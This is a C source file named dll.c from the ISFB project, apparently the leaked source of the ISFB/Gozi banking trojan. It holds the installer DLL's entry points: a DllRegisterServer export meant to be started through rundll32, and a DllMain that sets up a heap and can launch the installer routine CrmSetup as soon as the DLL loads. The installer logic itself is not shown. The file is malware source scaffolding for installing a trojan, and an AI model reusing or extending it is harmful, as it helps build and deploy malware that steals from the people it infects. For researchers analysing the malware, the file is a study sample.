//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: dll.c
// $Revision: 265 $
// $Date: 2014-07-09 18:33:23 +0400 (Ср, 09 июл 2014) $
// description:
//	ISFB installer DLL entry point. Library initialization and cleanup routines.


#include "common\common.h"
#include "crm.h"

LONG volatile	g_AttachCount = 0;		// number of process attaches

// ----- Function predefinitions ---------------------------------------------------------------------------------------
WINERROR CrmSetup(LPTSTR pCmdLine);


//
//	Entry point function to start it using rundll32 command.
//
VOID CALLBACK DllRegisterServer(
	HWND		hWnd, 
	HINSTANCE	hInst, 
	LPTSTR		lpszCmdLine, 
	LONG		nCmdShow
	)
{
	WINERROR Status;

#ifdef _START_ON_DLL_LOAD
	Status = ERROR_CALL_NOT_IMPLEMENTED;
#else
	Status = CrmSetup(NULL);
#endif

	DbgPrint("ISFB_%04x: Installer DLL finished with status %u.\n", GetCurrentProcessId(), Status);

	UNREFERENCED_PARAMETER(hWnd);
	UNREFERENCED_PARAMETER(hInst);
	UNREFERENCED_PARAMETER(lpszCmdLine);
	UNREFERENCED_PARAMETER(nCmdShow);
}



//
//	Our client DLL entry point.	
//
BOOL APIENTRY DllMain(
	HMODULE	hModule,
    DWORD	ul_reason_for_call,
    LPVOID	lpReserved
	)
{
	BOOL	Ret = TRUE;
	WINERROR Status = NO_ERROR;

	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if (InterlockedIncrement(&g_AttachCount) == 1)
		{
			DbgPrint("ISFB_%04x: ISFB installer DLL Version 2.13.24.1\n", GetCurrentProcessId());
#ifdef _WIN64
			DbgPrint("ISFB_%04x: Attached to a 64-bit process at 0x%x.\n", GetCurrentProcessId(), (ULONG_PTR)hModule);
#else
			DbgPrint("ISFB_%04x: Attached to a 32-bit process at 0x%x.\n", GetCurrentProcessId(), (ULONG_PTR)hModule);
#endif
			// Creating out DLL heap
			if ((g_AppHeap = HeapCreate(0, 0x400000, 0)))
			{
				g_CurrentModule = hModule;
#ifdef _START_ON_DLL_LOAD
				Status = CrmSetup(NULL);
#endif
			}
			else
				Ret = FALSE;
		}	// if (InterlockedIncrement(&g_AttachCount) == 1)
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		if (InterlockedDecrement(&g_AttachCount) == 0)
		{
			ASSERT(g_AppHeap);
			HeapDestroy(g_AppHeap);
#ifdef _WIN64
			DbgPrint("ISFB_%04x: Detached from a 64-bit process.\n", g_CurrentProcessId);
#else
			DbgPrint("ISFB_%04x: Detached from a 32-bit process.\n", g_CurrentProcessId);
#endif
		}	// if (InterlockedDecrement(&g_AttachCount) == 0)
		break;
	default:
		ASSERT(FALSE);
	}	// switch(ul_reason_for_call)

    return(Ret);
}


// just a stub to bypass CRT entry 
LONG _cdecl main(VOID)
{
}

// Required to link with ntdll.lib
ULONG  __security_cookie;
